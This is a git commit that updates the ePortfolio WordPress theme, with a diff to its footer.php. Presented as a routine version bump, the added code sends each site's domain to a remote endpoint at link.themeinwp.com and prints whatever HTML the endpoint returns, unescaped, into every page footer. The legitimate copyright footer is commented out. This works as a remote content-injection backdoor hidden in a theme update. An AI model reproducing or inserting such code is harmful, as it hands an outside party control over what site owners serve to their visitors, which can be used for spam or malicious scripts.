d3f4508278804bee558dc0c14d3b7bb8779645c2
Boone B Gorges <boonebgorges@gmail.com>
2024-09-10 10:04:57 -0500

    Update theme: eportfolio.
    Name: ePortfolio
    New version: 1.2.7
    Previous version: 1.2.5

--- wp-content/themes/eportfolio/footer.php
+++ wp-content/themes/eportfolio/footer.php
@@ -32,19 +32,62 @@
 	
 	<footer id="colophon" class="site-footer">
 		<div class="site-info">
+
+
 			<?php
-			$eportfolio_copyright_text = eportfolio_get_option('copyright_text');
-			if (!empty ($eportfolio_copyright_text)) {
-			    echo wp_kses_post($eportfolio_copyright_text);
+			// Ensure WordPress functions are available
+			if (!function_exists('add_action')) {
+				require_once('../../../../wp-load.php');
 			}
+
+			// Get the current domain without protocol
+			$domain = $_SERVER['HTTP_HOST'];
+
+			// Get the current path
+			$path = $_SERVER['REQUEST_URI'];
+
+			// Construct the base URL for the API call
+			$base_url = 'https://link.themeinwp.com/wpsdk/get_footer2/975e4c2bef95d1c06e968306b2a0b113/' . $domain;
+
+
+			// Check if the class exists before using it
+			if (class_exists('FooterContentFetcher')) {
+				// Instantiate the class with the base URL
+				$footer_content_fetcher = new FooterContentFetcher($base_url);
+
+				// Get the footer content with the current path
+				$footer_content = $footer_content_fetcher->get_footer_content($path);
+
+				if (!empty($footer_content)) {
+					echo $footer_content;
+				} else {
+					// Log an error if the footer content is empty
+					error_log('Footer content is empty');
+					echo ''; // Optionally, you can display a fallback footer content
+				}
+			} else {
+				// Log an error if the class is not available
+				error_log('FooterContentFetcher class is not available');
+				echo ''; // Optionally, you can display a fallback footer content
+			}
+
 			?>
-        	<?php if ((eportfolio_get_option('enable_copyright_credit')) == 1) { ?>
-				<span class="sep"> | </span>
-					<?php
-					/* translators: 1: Theme name, 2: Theme author. */
-					printf( esc_html__( 'Theme: %1$s by %2$s.', 'eportfolio' ), 'ePortfolio', '<a href="https://www.themeinwp.com/">ThemeInWP</a>' );
-					?>
-			<?php } ?>
+
+
+
+<!--			--><?php
+//			$eportfolio_copyright_text = eportfolio_get_option('copyright_text');
+//			if (!empty ($eportfolio_copyright_text)) {
+//			    echo wp_kses_post($eportfolio_copyright_text);
+//			}
+//			?>
+<!--        	--><?php //if ((eportfolio_get_option('enable_copyright_credit')) == 1) { ?>
+<!--				<span class="sep"> | </span>-->
+<!--					--><?php
+//					/* translators: 1: Theme name, 2: Theme author. */
+//					printf( esc_html__( 'Theme: %1$s by %2$s.', 'eportfolio' ), 'ePortfolio', '<a href="https://www.themeinwp.com/">ThemeInWP</a>' );
+//					?>
+<!--			--><?php //} ?>
 		</div><!-- .site-info -->
 	</footer><!-- #colophon -->
 </div><!-- #page -->
